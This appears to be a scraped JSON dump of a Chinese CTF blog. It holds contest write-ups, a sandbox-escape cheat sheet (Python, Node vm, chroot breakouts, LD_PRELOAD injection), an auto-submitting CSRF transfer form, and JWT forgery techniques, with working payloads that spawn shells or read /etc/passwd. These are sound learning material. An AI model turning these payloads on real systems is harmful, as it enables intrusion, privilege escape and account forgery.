[&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;]: wmi.WMI(namespace=&#x27;root\\WMI&#x27;).WmiMonitorBrightnessMethods()[0].WmiSetBrightness(Brightness=ord(i), Timeout=500) time.sleep(char(&#x27;!&#x27;))#菜鸡中的BOSS，简称菜包丝 无需知道wmi包及其函数（设置LCD背光亮度）的含义，N和B两字符替换为0和1，转16进制再转字符，简单粗暴。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020首届钓鱼城杯国际网络安全创新大赛","slug":"match-2020首届钓鱼城杯国际网络安全创新大赛","date":"2020-08-27T12:52:20.000Z","updated":"2020-08-27T13:41:24.217Z","comments":true,"path":"2020/08/27/match-2020首届钓鱼城杯国际网络安全创新大赛/","link":"","permalink":"https://lazzzaro.github.io/2020/08/27/match-2020%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%9B%BD%E9%99%85%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 再次水过的赛，rank-110/382。 Misc签到题 flag{Welcome_to_dycb} 简单粗暴。 ​ whitespace 附件：test 内容一片空白，第一反应想到snow隐写，用snow工具解密得无意义内容。 拖到010editor查看16进制，发现三种字符0x20、0x09、0x0A，其中0x0A数量少且按一定长度出现，猜测为分隔符，回到text中将0x20替换为0，0x09替换为1，再2进制转字符，得到flag。 ​ Cryptoconfused_flag nc 119.3.45.222 9999 每次nc都是不同结果，但出现的字符及数量不变，只是乱序，正确顺序能还原flag。 栅栏解密无果，尝试循环取1000次字符串以统计字母在不同位置出现的频次，按大小顺序依次取对应数量字符填入flag： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8from pwn import *#统计各字符数any_s=&#x27;flag&#123;beadfe08-7fee-3;dd9;961-b7efb21;9;65&#125;-d9;;8&#x27;dic=&#123;&#125;for i in any_s: if i not in dic: dic[i]=0 dic[i]+=1print(dic)s=[]flag=&#x27;?&#x27;*42#循环取1000个字符串用于统计for i in range(1000): print(i) try: r=remote(&#x27;119.3.45.222&#x27;,9999,timeout=2) s.append(r.recvline()) r.close() except: passdic2=&#123;&#125;for ss in s: for i in range(len(ss)): if ss[i] not in dic2: dic2[ss[i]]=&#123;&#125; if i not in dic2[ss[i]]: dic2[ss[i]][i]=0 dic2[ss[i]][i]+=1 for k,v in dic2.items(): if k.strip()!=&#x27;&#x27;: print((k,dic[k])) res=sorted(v.items(), key=lambda d:d[1], reverse = True) print(res[:dic[k]]) for j in dic[k]: flag[res[j][1]]=k print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020第四届强网杯全国网络安全挑战赛","slug":"match-2020第四届强网杯全国网络安全挑战赛","date":"2020-08-23T03:48:59.000Z","updated":"2020-08-27T12:50:44.767Z","comments":true,"path":"2020/08/23/match-2020第四届强网杯全国网络安全挑战赛/","link":"","permalink":"https://lazzzaro.github.io/2020/08/23/match-2020%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"","text":"​ 又称PWN杯，题型分类数量严重不均。不记奇怪的MIX分类【强网先锋】，数量：PWN=(Crypto+Misc)×3。 没做出几题，蒟蒻。 Misc签到简单粗暴。 ​ 强网先锋主动 http://39.96.23.228:10002 简单RCE。 /?ip=127.0.0.1;ls 列目录发现 flag.php； /?ip=127.0.0.1;cat flag.php 提示 no flag，过滤了关键字 flag； /?ip=127.0.0.1;a=ag.php;b=fl;cat $b$a 绕过关键字，查看注释拿到flag。 ​ Funhash hash is really fun. http://39.101.177.96/ 绕过套娃。 level 1 $_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]) md4加密前后字符串相等，PHP弱类型比较，易想到科学计数法表示的0e开头字符串可绕过。 寻找满足条件的0e串： 1234567891011121314151617$i = 0;$c = 0;while (true) &#123; if ((++$c % 1000000) == 0) &#123; printf(&quot;.&quot;); &#125; $n = &quot;0e&quot; . $i++; $h = hash(&#x27;md4&#x27;, $n); if ($n == $h) &#123; printf(&quot;\\nFound: $n\\n&quot;); break; &#125;&#125;//Found: 0e251288019 PAYLOAD1: hash1=0e251288019 level 2 $_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]) 需要hash2和hash3的值相等且md5值不等，强类型比较，所以只能用经典数组方法绕过。 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 PAYLOAD2: hash2[]=aaa&amp;hash3[]=bbb level 3 $query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;; md5(string,raw) string 必需。规定要计算的字符串。raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。 寻找一个字符串，其md5值的16字符二进制形式能使 WHERE 部分为真，用经典绕过字符串ffifdyop，经过md5函数后结果为 &#39;or&#39;6�]��!r,��b。 PAYLOAD3: hash4=ffifdyop ​ upload 附件：data.pcapng Wireshark查看流量包，发现steghide.php，内含一张jpg图，导出并还原 根据文件名steghide提示，steghide隐写，命令一把梭，密码为弱密码123456： steghide extract -sf steghide.jpg -p 123456 ​ bank nc 39.101.134.52 8005 hint: pow的字符集为大小写字母+数字 nc交互题，过了sha256认证后，输入名字： 可以发现初始cash=10，而get flag需要cash=1000。 transact可以与任一用户交易cash，view records可以查看交易值大于100的记录，provide a record 提供交易记录，hint发现交易加密方式为ECB，加密内容为发送者+接收者+交易值。 既然需要从cash=10增加到cash=1000，由于transact的交易额没有任何限制，那么交易负值岂不可以从任一用户处得到cash？尝试发现居然可行，直接非预期拿到flag，神奇三血…… 12345678910111213141516171819202122232425from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=3)r = remote(&quot;39.101.134.52&quot;,8005)data = r.recvline()prefix, s = parse(&quot;sha256(XXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvuntil(&#x27;teamtoken:&#x27;)r.sendline(&#x27;icq109e2eff64d5d38cd2a0191b42cff&#x27;)r.recvuntil(&#x27;give me your name:&#x27;)r.sendline(&#x27;ssss&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;transact&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;ttt -1000&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;get flag&#x27;)print(r.recvall())","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"沙盒逃逸","slug":"misc-沙盒逃逸","date":"2020-08-21T12:00:36.000Z","updated":"2022-12-08T16:57:08.528Z","comments":true,"path":"2020/08/21/misc-沙盒逃逸/","link":"","permalink":"https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/","excerpt":"","text":"​ 沙盒逃逸 / 沙箱逃逸沙箱逃逸，就是在给我们的一个代码执行环境下（Oj或使用socat生成的交互式终端），脱离种种过滤和限制，最终成功拿到shell权限的过程。 Python / Pyjail内置函数/变量123456789101112dir() #不带参数时,返回当前范围内的变量、方法和定义的类型列表；带参数时,返回参数的属性、方法列表globals() #全局变量locals() #局部变量chr()/ord() #字符与ASCII码转换open() #读文件input() #输入__import__() #载入模块__builtins__ #包含当前运行环境中默认的所有函数与类__file__ #该变量指示当前运行代码所在路径__class__ #当前对象所属的类，如&#x27;&#x27;.__class__会返回&lt;class &#x27;str&#x27;&gt;__base__ #当前类的基类，如str.__base__会返回&lt;class &#x27;object&#x27;&gt;__doc__ #类的帮助文档，默认类均有帮助文档 模块1234567891011121314151617181920#osimport osos.system(&#x27;dir&#x27;)os.popen(&#x27;dir&#x27;).read()#platformimport platformplatform.popen(&#x27;dir&#x27;).read()platform.os.system(&#x27;dir&#x27;)#timeitimport timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;)#sysfrom sys import modulesmodules[&#x27;os&#x27;].system(&#x27;sh&#x27;)modules[&#x27;posix&#x27;].system(&#x27;sh&#x27;)sys._getframe().f_locals.values() import123__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;sh&#x27;)(lambda: __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;))() 重载模块 / 重新引入1234567891011#得到完整__builtin__模块reload(__builtin__)import impimp.reload(__builtin__)#重新引入osimport syssys.modules[&#x27;os&#x27;]=&#x27;/usr/lib/python2.7/os.py&#x27;execfile(&#x27;/usr/lib/python2.7/os.py&#x27;) dis模块解析1234#dis.code_info限制names数量__getattribute__ = (None).__getattribute__(&#x27;__class__&#x27;);__getattribute__ = __getattribute__.__getattribute__(__getattribute__, &#x27;__base__&#x27;);__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__, &#x27;__subclasses__&#x27;)()[84](), &#x27;load_module&#x27;) (&#x27;os&#x27;), &#x27;system&#x27;) (&#x27;sh&#x27;) 函数调用 / 命令执行 / 交互1234567891011121314151617181920212223242526272829303132#属性/字典getattr(__import__(&#x27;os&#x27;),&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__getattribute__(&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__dict__.__getitem__(&#x27;system&#x27;)(&#x27;dir&#x27;)#os._wrap_close类().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;) #object类 - warnings.WarningMessage类().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;system&#x27;](&quot;sh&quot;)#help()函数#参考#https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell#https://blog.maple3142.net/2021/07/05/0CTF-2021-quals-writeups/#pypypypy#https://satoooon1024.hatenablog.com/entry/2021/12/15/SECCON_CTF_2021_Writeup#misc-hitchhike-16-solves#https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Misc-227pts-hitchhike#http://tttang.com/archive/1428/#toc_0x03-2seccon-2021-hitchhikehelp() =&gt; os =&gt; !shhelp() =&gt; __main__help() =&gt; [filename]#调试器#pdb模块定义了一个交互式源代码调试器，用于Python程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意Python代码。它还支持事后调试，可以在程序控制下调用。breakpoint()#_posixsubprocess.fork_exec#不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样#参考https://ctftime.org/writeup/31883import os__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) 文件读取123456open(&#x27;1.txt&#x27;).read()#object类().__class__.__base__.__subclasses__()[40](&quot;1.txt&quot;).read()().__class__.__bases__[0].__subclasses__()[40](&quot;1.txt&quot;).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](&quot;1.txt&quot;).read() 关键字过滤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#x27;sys&#x27;+&#x27;tem&#x27; =&gt; &#x27;system&#x27;&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;) =&gt; &#x27;__import__&#x27;&#x27;&#x27;.join([&#x27;__imp&#x27;,&#x27;ort__&#x27;]) =&gt; &#x27;__import__&#x27;&#x27;__tropmi__&#x27;[::-1] =&gt; &#x27;__import__&#x27;&#x27;__imp&#x27;+&#x27;ort__&#x27; =&gt; &#x27;__import__&#x27;&#x27;__buihf9ns__&#x27;.replace(&#x27;hf9&#x27;,&#x27;ldi&#x27;) =&gt; &#x27;__buildins__&#x27;dir()[0] =&gt; &#x27;_&#x27;eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) =&gt; __import__(&quot;os&quot;)bytes([46, 47, 102, 108, 97, 103]).decode() =&gt; &#x27;./flag&#x27;import codecsgetattr(os,codecs.encode(&quot;flfgrz&quot;,&#x27;rot13&#x27;))(&#x27;ifconfig&#x27;)#过滤evalexec(&quot;import os;os.system(&#x27;curl xxx&#x27;)&quot;)#过滤数字0=False1=True2=True+True=True-(-True)3=True+True+True=True-(-True)-(-True)#过滤request#字符串request:list(globals().keys())[11]#request值：globals()[list(globals().keys())[11]]#过滤引号chr(123)str()#字符串连接&#x27;&#x27;,join([&#x27;a&#x27;,&#x27;b&#x27;])#盲注time.sleep(3) if open(&#x27;/flag&#x27;).read()[0]==&#x27;c&#x27; else 1flag.index(&#x27;flag&#123;...&#x27;)type(flag.split())(type(flag.split())(flag).pop(&#123;..&#125;).encode()).remove(&#123;..&#125;)#其他技巧eval(input())breakpoint() #调试模式help()(lambda:os.system(&#x27;/bin/sh&#x27;))()#修饰符@exec@inputclass A: pass 注释逃逸Python 中的编解码器 raw_unicode_escape 允许Python文件解释Unicode编码的字符，使用 raw_unicode_escape 编码器将 \\uxxxx 解释成对应的ASCII字符，比如换行符 \\u000a ，这样可以在 Python 的注释中隐藏恶意代码。 12345#!/usr/bin/env python# -*- coding: raw_unicode_escape -*-#\\u000aimport os#\\u000aos.system(&quot;ls /&quot;)#\\u000aos.system(&quot;cat /flag&quot;) 参考： [PyJail] python沙箱逃逸探究·总览 eval变量覆盖12345# a=&#123;&#x27;test&#x27;:0&#125; =&gt; a=&#123;&#x27;test&#x27;:1&#125;[[str][0]for[a[&#x27;test&#x27;]]in[[1]]]#环境变量[[str][0]for[os.environ[&#x27;test&#x27;]]in[[&#x27;xxx&#x27;]]] ​ node.js前端在前端中，可能会使用删除 eval ，重写 Function.prototype.constructor / GeneratorFunction / AsyncFunction 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。 服务端JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。 在原生的沙箱模块中，常用的逃逸方式为： 12345678const sandbox = &#123;&#125;;const whatIsThis = vm.runInNewContext(` const ForeignObject = this.constructor; const ForeignFunction = ForeignObject.constructor; const process = ForeignFunction(&quot;return process&quot;)(); const require = process.mainModule.require; require(&quot;fs&quot;);`, sandbox); 一般来说，在Context下运行的代码应该只属于该隔离环境。然而，this是一个特别的，this指向runInContext(line, context)这一句里的context变量，它属于沙盒外，实际上，它是一个&#123;&#125;。 1234567891011//列目录this.constructor.constructor(&#x27;return this.process.binding&#x27;)()(&#x27;fs&#x27;).readdir(&#x27;/&#x27;,function (err, data) &#123;data&#125;)//读文件this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;fs&quot;).readFileSync(&quot;/etc/passwd&quot;).toString()//命令执行&quot; &quot;.toString.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /etc/passwd&#x27;).toString()&quot;)()const &#123;spawnSync&#125; = this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#x27;child_process&#x27;) spawnSync(&#x27;cat /flag&#x27;, [], &#123;stdio: &#x27;inherit&#x27;&#125;); 考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如： 12345vm.runInNewContext( &#x27;Promise.resolve().then(()=&gt;&#123;while(1)console.log(&quot;foo&quot;, Date.now());&#125;); while(1)console.log(Date.now())&#x27;, &#123;console:&#123;log()&#123;console.log.apply(console,arguments);&#125;&#125;&#125;, &#123;timeout:5&#125;); 参考SSTI (Server Side Template Injection) ​ chrootchroot逃逸的核心是使进程中存在一个文件，处于根目录树之外。 参考：I’M IN CHROOT JAIL, GET ME OUT OF HERE! mount1234mount /dev/sda1 /tmpcd /tmpcd /tmp/bin./cat /tmp/etc/passwd /proc12ls /proc/*/rootcd /proc/[PID]/root 清空env查看env可以发现，有个奇怪的变量：LD_PRELOAD=libfakechroot.so，它是一个用于在用户权限下更改root目录的工具。 只要把这个环境变量给删掉：env LD_PRELOAD=/bash，就在真正的root中了。 可执行程序123cat &lt;&lt; EOF &gt; getmeoutofhere.c[内容]EOF C 123456789101112131415161718192021222324// Shortened version of this:// http://www.bpfh.net/simes/computing/chroot-break.html#include &lt;stdio.h&gt; #include &lt;errno.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; int main() &#123; int x; /* Used to move up a directory tree */ int dir_fd; /* File descriptor to directory */ mkdir(&quot;chroot-breakout-dir&quot;, 0755); dir_fd=open(&quot;.&quot;, O_RDONLY); chroot(&quot;chroot-breakout-dir&quot;); fchdir(dir_fd); close(dir_fd); for(x = 0; x &lt; 1024; x++) &#123; chdir(&quot;..&quot;); &#125; chroot(&quot;.&quot;); system(&quot;/bin/sh&quot;);&#125; Perl 123456789101112131415161718192021222324252627282930313233#!/usr/bin/perl -wuse strict;# unchroot.pl Dec 2007# http://pentestmonkey.net/blog/chroot-breakout-perl# This script may be used for legal purposes only.# Go to the root of the jailchdir &quot;/&quot;;# Open filehandle to root of jailopendir JAILROOT, &quot;.&quot; or die &quot;ERROR: Couldn&#x27;t get file handle to root of jailn&quot;;# Create a subdir, move into itmkdir &quot;mysubdir&quot;;chdir &quot;mysubdir&quot;;# Lock ourselves in a new jailchroot &quot;.&quot;;# Use our filehandle to get back to the root of the old jailchdir(*JAILROOT);# Get to the real rootwhile ((stat(&quot;.&quot;))[0] != (stat(&quot;..&quot;))[0] or (stat(&quot;.&quot;))[1] != (stat(&quot;..&quot;))[1]) &#123; chdir &quot;..&quot;;&#125;# Lock ourselves in real root - so we&#x27;re not really in a jail at all nowchroot &quot;.&quot;;# Start an un-jailed shellsystem(&quot;/bin/sh&quot;); libc注入echo -e 可以写入二进制程序，利用 echo -e 上传so文件。利用elf文件动态加载环境变量更换libc，实现libc注入。 1234567891011121314151617import osfrom pwn import *#context.log_level=&#x27;debug&#x27;io = remote(&quot;xxx&quot;,xxx)b = open(&quot;./in.so&quot;).read().encode(&quot;hex&quot;)c = &quot;&quot;for i in range(0,len(b),2): c += &#x27;\\\\x&#x27;+b[i]+b[i+1]payload = &#x27;echo -e &quot;&#x27;+c+&#x27;&quot;&#x27;+&#x27;&gt; exp&#x27;print &quot;[+] length: &quot; + hex(len(payload))io.sendline(payload)io.sendline(&quot;LD_PRELOAD=$PWD/exp /bin/sh&quot;)io.interactive() 1234567891011// in.so#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;int getchar()&#123; chmod(&quot;flag&quot;,777); printf(&quot;%s\\n&quot;, &quot;6666666&quot;);&#125;#gcc -shared -fPIC in.c -o in.so#LD_PRELOAD=$PWD/in.so /bin/sh","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"逃逸","slug":"逃逸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"}],"author":"Lazzaro"},{"title":"CSRF","slug":"web-CSRF","date":"2020-08-17T13:57:41.000Z","updated":"2020-10-25T15:38:41.201Z","comments":true,"path":"2020/08/17/web-CSRF/","link":"","permalink":"https://lazzzaro.github.io/2020/08/17/web-CSRF/","excerpt":"","text":"​ 跨站请求伪造（CSRF）CSRF，全名 Cross Site Request Forgery，跨站请求伪造。很容易将它与 XSS 混淆，对于 CSRF，其两个关键点是跨站点的请求与请求的伪造，由于目标站无 token 或 referer 防御，导致用户的敏感操作的每一个参数都可以被攻击者获知，攻击者即可以伪造一个完全一样的请求以用户的身份达到恶意目的。 按请求类型，可分为 GET 型和 POST 型。 按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。 HTML CSRF使用表单来对 POST 型的请求进行伪造： 123456789101112131415161718192021222324252627282930313233343536373839&lt;!--click.html--&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt; This page forges an HTTP POST request.&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt; function post(url, fields) &#123; //create a &lt;form&gt; element. var p = document.createElement(&quot;form&quot;); //construct the form p.action = url; p.innerHTML = fields; p.target = &quot;_self&quot;; p.method = &quot;post&quot;; //append the form to the current page. document.body.appendChild(p); //submit the form p.submit(); &#125; function csrf_hack() &#123; var fields; // The following are form entries that need to be filled out // by attackers. The entries are made hidden, so the victim // won&#x27;t be able to see them. fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;target&#x27; value=&#x27;aaaaaa&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;money&#x27; value=&#x27;10000&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;messages&#x27; value=&#x27;test&#x27;&gt;&quot;; post(&#x27;http://173.82.206.142:8005/transfer.php&#x27;, fields); &#125; // invoke csrf_hack() after the page is loaded. window.onload = function() &#123; csrf_hack(); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"}],"author":"Lazzaro"},{"title":"JWT","slug":"web-JWT","date":"2020-08-11T11:38:44.000Z","updated":"2022-11-10T17:15:23.716Z","comments":true,"path":"2020/08/11/web-JWT/","link":"","permalink":"https://lazzzaro.github.io/2020/08/11/web-JWT/","excerpt":"","text":"​ JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。 JWT由三个部分组成：header.payload.signature header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC和RSA算法），typ声明类型为JWT。 payload则为用户数据以及一些元数据有关的声明，用以声明权限。 signature的功能是保护token完整性。 生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。 抽象成公式就是 signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key) 值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。 完整token生成在线https://jwt.io/ Pythonpython的Pyjwt使用示例： 12345import jwtencoded_jwt = jwt.encode(&#123;&#x27;user_name&#x27;: &#x27;admin&#x27;&#125;, &#x27;key&#x27;, algorithm=&#x27;HS256&#x27;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#x27;key&#x27;, algorithms=[&#x27;HS256&#x27;])) ​ 攻击方式空加密算法JWT支持使用空加密算法，可以在header中指定alg为None 这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段 12345678&#123; &quot;alg&quot; : &quot;None&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125;&#123; &quot;user&quot; : &quot;Admin&quot;&#125; 生成的完整token为ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0 (header+’.’+payload，去掉了’.’+signature字段) 空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。 ​ 修改RSA加密算法为HMACJWT中最常用的两种算法为HMAC和RSA。 HMAC是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。 RSA则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。 在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。 现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。 1234&#123; &quot;alg&quot; : &quot;RS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; 通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即 1234&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; 同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。 服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。 12345#python2import jwtpublic = open(&#x27;public.key&#x27;, &#x27;r&#x27;).read()payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;print(jwt.encode(payload, key=public, algorithm=&#x27;HS256&#x27;)) 123456import jwtheader = &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;payload = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;grade&quot;:&quot;admin&quot;&#125;secret = open(&#x27;public.pem&#x27;,&#x27;r&#x27;).read()jwt_ = jwt.encode(headers=header,payload=payload,key=secret,algorithm=&#x27;HS256&#x27;)print(jwt_) ​ 爆破密钥对 JWT 的密钥爆破需要在一定的前提下进行： 知悉JWT使用的加密算法 一段有效的、已签名的token 签名用的密钥不复杂（弱密钥） 所以其实JWT 密钥爆破的局限性很大。 相关工具： gojwtcrack ./gojwtcrack -t token.txt -d rockyou.txt c-jwt-cracker ./jwtcrack [JWT] jwt_tool python3 jwt_tool.py [JWT] CrackJWTKey python3 CrackJWT.py jwt_str keys.txt ​ 其他参考： 攻击JWT的一些方法 Jwt认识与攻击","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"}],"author":"Lazzaro"},{"title":"CBCTF 第三届赛博杯","slug":"match-CBCTF-第三届赛博杯","date":"2020-07-28T12:31:07.000Z","updated":"2020-07-28T14:04:37.567Z","comments":true,"path":"2020/07/28/match-CBCTF-第三届赛博杯/","link":"","permalink":"https://lazzzaro.github.io/2020/07/28/match-CBCTF-%E7%AC%AC%E4%B8%89%E5%B1%8A%E8%B5%9B%E5%8D%9A%E6%9D%AF/","excerpt":"","text":"​ 从群友@Neve3no处得知并打打酱油的小赛~~ ​ Miscsign_in 66 6c 61 67 7b 39 35 63 35 62 66 33 32 32 39 32 64 37 35 66 35 37 61 35 30 36 37 36 66 36 61 62 35 64 64 38 33 7d 直接hex转string得flag。 ​ α层 这波啊，这波在阿尔法层 用stegsolve工具将两张图片xor操作，圈中正确flag。 ​ guess 有些事，看得很清，却说不清；有些人，了解很深，却猜不透；有些理，很想不通，却行的通。 地址：47.52.113.129 12345 猜数字，误差值小到0.001的值算成功。先输入给的值，然后到轮自己给数，输入范围0.00-10000.00内任何一个数，脚本二分法猜测最坏情况都能在 $\\log_2{10000*100} \\approx 19.9$ 次猜出。 考虑特殊数值NaN，用来表示一个本来要返回数值的操作数未返回数值的情况。任何涉及NaN的操作都会返回NaN，其次，它与任何值都不等，包括自身。 输入nan，脚本猜测次数超过20，拿到flag。 ​ Web尖尖的商店 尖尖开了一个商店,快看能不能买到flag吧 http://checkin.race2020.0rays.club/ 一个购买页面，余额1000不足以购买99999价值的flag。抓包发现余额值存储于cookie里的money中，直接修改提交请求，拿到flag。 ​ 